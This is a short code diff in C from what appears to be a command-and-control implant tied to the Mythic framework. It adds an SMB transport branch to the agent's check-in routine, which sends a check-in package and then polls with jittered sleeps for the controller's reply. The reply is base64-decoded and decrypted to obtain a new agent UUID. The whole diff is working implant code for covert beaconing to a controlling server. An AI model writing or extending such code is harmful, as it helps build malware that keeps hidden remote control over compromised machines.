@@ -208,9 +208,50 @@ BOOL CheckinSend()
     PackageAddString(CheckinData, (PCHAR) "1.1.1.1", TRUE);    // TODO
 
 
-    /* Send the checkin package */
+    /* Send checkin package and wait for success */
+
     PARSER Output = { 0 };
+
+#ifdef HTTPX_TRANSPORT
+
     PackageSend(CheckinData, &Output);
+
+#endif
+
+#ifdef SMB_TRANSPORT
+
+    PBYTE  pOutData  = NULL;
+    SIZE_T OutLen    = 0;
+    SIZE_T sizeUuid  = TASK_UUID_SIZE;
+
+    PackageSend(CheckinData, NULL);
+
+    _dbg("[SMB] Waiting for checkin response...");
+
+    // Sloppy 
+    while ( pOutData == NULL || OutLen == 0 )
+    {
+
+        SleepWithJitter(xenonConfig->sleeptime, xenonConfig->jitter);
+
+        SmbRecieve(&pOutData, &OutLen);
+
+    }
+
+    ParserNew(&Output, pOutData, OutLen);
+
+    if ( !ParserBase64Decode(&Output) ) {
+        _err("Base64 decoding failed");
+    }
+    PCHAR receivedPayloadUUID = ParserGetString(&Output, &sizeUuid);
+    if ( xenonConfig->isEncryption )
+    {
+        if (!CryptoMythicDecryptParser(&Output)) {
+            _err("Failed to decrypt parser");
+        }
+    }
+
+#endif
 
 
     /* Set new agent UUID from checkin response */
